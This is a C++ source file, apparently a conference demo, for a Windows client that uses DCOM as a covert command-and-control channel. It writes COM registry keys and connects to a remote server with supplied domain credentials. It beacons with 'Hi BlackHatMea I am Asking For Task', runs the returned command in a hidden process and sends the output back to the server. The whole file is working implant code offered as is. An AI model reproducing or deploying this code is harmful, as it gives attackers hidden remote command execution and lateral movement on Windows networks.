#include <Windows.h>
#include <atlbase.h>
#include <iostream>
#include <Bits.h>

#include <iostream>
#include <string>
#include <locale>
#include <codecvt>

#include "..\DCOMDemo\DCOMDemo_i.h"

#pragma warning(disable:4996)

BOOL ExecuteShellCommand(std::string ApplicationName, std::string CommandLineArgs,std::wstring &Output) {
    //std::string ApplicationName = argumentParser("Run");
    //std::string CommandLineArgs = argumentParser("Args");
    std::string strResult;
    HANDLE hPipeRead, hPipeWrite;
    BOOL ReturnV = FALSE;
    SECURITY_ATTRIBUTES saAttr = { 0 };
    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe to get results from child's stdout.
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        //RED_//DPRINT("Fail To CreatePipe\n");
        return FALSE;
    }

    STARTUPINFOW si = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
    PROCESS_INFORMATION pi = { 0 };

    BOOL fSuccess = CreateProcessA(ApplicationName.c_str(), (LPSTR)CommandLineArgs.c_str(), NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    if (!fSuccess) {
        //RED_//DPRINT("Fail To CreateProcessA\n");
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        return FALSE;
    }

    BOOL bProcessEnded = FALSE;
    int checksize = 0;
    int size = 0;
    std::string tmp;
    int i = 0;
    DWORD timeout = GetTickCount() + (5 * 1000);
    for (; !bProcessEnded;) {
        // Give some timeslice (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;

        // Even if process exited - we continue reading, if
        // there is some data available over pipe.

        while (1) {
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL)) {
                //RED_//DPRINT("PeekNamedPipe Error\n");
                break;
            }

            if (GetTickCount() > timeout && dwAvail == 0) {
                TerminateProcess(pi.hProcess, 1);
                //RED_//DPRINT("timeout occurs\n");
                goto clean;
                break;
            }

            if (!dwAvail) {
                //DPRINT("dwAvail\n"); // No data available, return
                break;
            }

            tmp.resize(8192);
            if (!ReadFile(hPipeRead, &tmp[0], 8192, &dwRead, NULL) || !dwRead) {
                // Error, the child process might have ended
                //RED_//DPRINT("Error ReadFile\n");
                break;
            }

            checksize += dwRead;
            strResult += tmp.substr(0, dwRead);
            size += dwRead;
            tmp.clear();
            dwRead = 0;
            dwAvail = 0;
            i++;
        }
    }

    if (!strResult.empty()) {
        //Waree//DPRINTC2(strResult.c_str(), checksize, SHELL_RESULT, TaskID);
        std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
        std::wstring wideString = converter.from_bytes(strResult);
        Output = wideString;

    }
    else {
        printf("Error executing command");
    }

    ////DPRINT("Out ExecCmd\n");
    ReturnV = TRUE;

clean:
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return ReturnV;
}

void PrintErrorMessage(const std::string& message) {
    DWORD errorCode = GetLastError();
    std::cerr << "Error: " << message << ". Error code: " << errorCode << std::endl;
}

std::wstring GetCurrentProcessPath() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(nullptr, buffer, MAX_PATH);
    std::wstring path(buffer);
    size_t lastSlashPos = path.find_last_of(L"\\/");
    if (lastSlashPos != std::wstring::npos) {
        path = path.substr(0, lastSlashPos);
    }
    return path;
}

std::wstring GetCurrentFolderPath() {
    wchar_t buffer[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, buffer);
    return buffer;
}

int SetupRegistyKeys() {
    HKEY hKey;
    LONG result;

    // Open or create the root key
    result = RegCreateKeyExW(HKEY_CLASSES_ROOT, L"Interface\\{A68E05E3-4094-4C62-A050-B75146882D38}", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open root key");
        return 1;
    }

    // Set the default value
    result = RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)L"ICOMServer", sizeof(L"ICOMServer"));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set default value");
        RegCloseKey(hKey);
        return 1;
    }

    // Create and set the ProxyStubClsid32 subkey
    HKEY subKey;
    result = RegCreateKeyExW(hKey, L"ProxyStubClsid32", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open ProxyStubClsid32 subkey");
        RegCloseKey(hKey);
        return 1;
    }
    result = RegSetValueExW(subKey, NULL, 0, REG_SZ, (BYTE*)L"{00020424-0000-0000-C000-000000000046}", sizeof(L"{00020424-0000-0000-C000-000000000046}"));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for ProxyStubClsid32 subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }
    RegCloseKey(subKey);

    // Create and set the TypeLib subkey
    result = RegCreateKeyExW(hKey, L"TypeLib", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open TypeLib subkey");
        RegCloseKey(hKey);
        return 1;
    }
    result = RegSetValueExW(subKey, NULL, 0, REG_SZ, (BYTE*)L"{4F0D5B9A-F7CC-4C28-A637-A3AA67A93793}", sizeof(L"{4F0D5B9A-F7CC-4C28-A637-A3AA67A93793}"));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for TypeLib subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }

    result = RegSetValueExW(subKey, L"Version", 0, REG_SZ, (BYTE*)L"1.0", sizeof(L"1.0"));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for TypeLib\\Version subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }

    //// Create and set the 0 subkey
    HKEY subSubKey;
    RegCloseKey(subKey);
    RegCloseKey(hKey);

    // Open or create the TypeLib key
    result = RegCreateKeyExW(HKEY_CLASSES_ROOT, L"TypeLib\\{4F0D5B9A-F7CC-4C28-A637-A3AA67A93793}", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open TypeLib key");
        return 1;
    }

    // Create and set the 1.0 subkey
    result = RegCreateKeyExW(hKey, L"1.0", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open 1.0 subkey");
        RegCloseKey(hKey);
        return 1;
    }
    result = RegSetValueExW(subKey, NULL, 0, REG_SZ, (BYTE*)L"DCOMDemoLib", sizeof(L"DCOMDemoLib"));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for 1.0 subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }

    // Create and set the 0 subkey
    result = RegCreateKeyExW(subKey, L"0", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subSubKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open 0 subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }

    HKEY subSubSubKey;
    result = RegCreateKeyExW(subSubKey, L"win32", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subSubSubKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open win32 subkey");
        RegCloseKey(subSubKey);
        RegCloseKey(subSubSubKey);

        RegCloseKey(hKey);
        return 1;
    }
    std::wstring currentProcessPath = GetCurrentProcessPath();
    result = RegSetValueExW(subSubSubKey, NULL, 0, REG_SZ, (BYTE*)currentProcessPath.c_str(), static_cast<DWORD>((currentProcessPath.length() + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for win32 subkey");
        RegCloseKey(subSubSubKey);
        RegCloseKey(subSubKey);
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(subSubSubKey);
    RegCloseKey(subSubKey);
    // Create and set the FLAGS subkey
    result = RegCreateKeyExW(subKey, L"FLAGS", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subSubKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open FLAGS subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }
    result = RegSetValueExW(subSubKey, NULL, 0, REG_SZ, (BYTE*)L"0", sizeof(L"0"));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for FLAGS subkey");
        RegCloseKey(subSubKey);
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }
    RegCloseKey(subSubKey);

    // Create and set the HELPDIR subkey
    result = RegCreateKeyExW(subKey, L"HELPDIR", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &subSubKey, NULL);
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to create or open HELPDIR subkey");
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }






    std::wstring currentFolderPath = GetCurrentFolderPath();
    result = RegSetValueExW(subSubKey, NULL, 0, REG_SZ, (BYTE*)currentFolderPath.c_str(), static_cast<DWORD>((currentFolderPath.length() + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        // Handle error
        PrintErrorMessage("Failed to set value for HELPDIR subkey");
        RegCloseKey(subSubKey);
        RegCloseKey(subKey);
        RegCloseKey(hKey);
        return 1;
    }
    RegCloseKey(subSubKey);

    RegCloseKey(subKey);
    RegCloseKey(hKey);

    return 0;
}





int RunDCOM(const wchar_t* UsernameW, const wchar_t* PasswordW, const wchar_t* DomainW, LPWSTR DstTargetW) {
	IID ApplicationIID;
	COAUTHINFO* authInfo = (COAUTHINFO*)malloc(sizeof(COAUTHINFO));
	COAUTHIDENTITY* authidentity = (COAUTHIDENTITY*)malloc(sizeof(COAUTHIDENTITY));
	COSERVERINFO* srvinfo = (COSERVERINFO*)malloc(sizeof(COSERVERINFO));

   

	IIDFromString(L"{a68e05e3-4094-4c62-a050-b75146882d38}", &ApplicationIID);


	HRESULT hr = CoInitialize(nullptr);



	authidentity->User = (USHORT*)UsernameW;
	authidentity->Password = (USHORT*)PasswordW;
	authidentity->Domain = (USHORT*)DomainW;
	authidentity->UserLength = (ULONG)wcslen(UsernameW);
	authidentity->PasswordLength = (ULONG)wcslen(PasswordW);
	authidentity->DomainLength = (ULONG)wcslen(DomainW);
	authidentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

	{
		authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
		authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
		authInfo->pwszServerPrincName = NULL;
		authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
		authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		authInfo->pAuthIdentityData = authidentity;
		authInfo->dwCapabilities = EOAC_NONE;
	}

	{
		srvinfo->dwReserved1 = 0;
		srvinfo->dwReserved2 = 0;
		srvinfo->pwszName = DstTargetW;
		srvinfo->pAuthInfo = authInfo;
	}

	SOLE_AUTHENTICATION_LIST authentlist;

	authentlist.cAuthInfo = 2;
	authentlist.aAuthInfo = (SOLE_AUTHENTICATION_INFO*)authInfo;

	MULTI_QI mqi[1] = { &ApplicationIID, NULL, hr };

	hr = CoCreateInstanceEx(__uuidof(COMServer), nullptr, CLSCTX_REMOTE_SERVER,
		srvinfo, 1, mqi);
	if (!SUCCEEDED(hr)) {
		printf("CoCreateInstance failed: 0x%08lx", hr);
		return 1;
	}
	CoSetProxyBlanket(
		mqi->pItf, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
		RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, authidentity,
		EOAC_NONE);
	CComPtr<ICOMServer> spDemo;
    

    mqi->pItf->QueryInterface(&spDemo);

	//mqi->pItf->QueryInterface(&spDemo);


	if (SUCCEEDED(hr)) {
		int ResultSize = 0;
		int SendSize = 20;
		BSTR* Result = NULL;
        std::wstring Output;
		Result = (BSTR*)CoTaskMemRealloc(Result, 1);
		BSTR SData = SysAllocString(L"Hi BlackHatMea I am Asking For Task :>\n");
		hr = spDemo->COMSend(SData, SendSize, &ResultSize, Result);
		printf("Get New Task: ");
		printf("%S\n", *Result);
        std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
        std::string regularStr = converter.to_bytes(*Result);
        size_t spacePos = regularStr.find(' ');
        std::string Application = regularStr.substr(0, spacePos);
        std::string CommandLine = regularStr.substr(spacePos + 1);
        printf("Application:%s\n", Application.c_str());
        printf("CommandLine:%s\n", CommandLine.c_str());
        ExecuteShellCommand(Application, CommandLine, Output);
        printf("Command OutPut:\n%S\n", Output.c_str());
        BSTR OutPut = SysAllocString(Output.c_str());
        hr = spDemo->COMSend(OutPut, Output.length(), &ResultSize, Result);

	}

	CoUninitialize();
	return 0;

}


int main(int argc, char* argv[]) {
    SetupRegistyKeys();
	if (argc != 5) {
		std::cerr << "Usage: program_name <IPAddress> <Username> <Password> <Domain>" << std::endl;
		return 1;
	}

	std::wstring ipAddress = std::wstring(argv[1], argv[1] + strlen(argv[1]));
	std::wstring username = std::wstring(argv[2], argv[2] + strlen(argv[2]));
	std::wstring password = std::wstring(argv[3], argv[3] + strlen(argv[3]));
	std::wstring domain = std::wstring(argv[4], argv[4] + strlen(argv[4]));

	RunDCOM(username.c_str(), password.c_str(), domain.c_str(), (LPWSTR)ipAddress.c_str());
	return 0;
}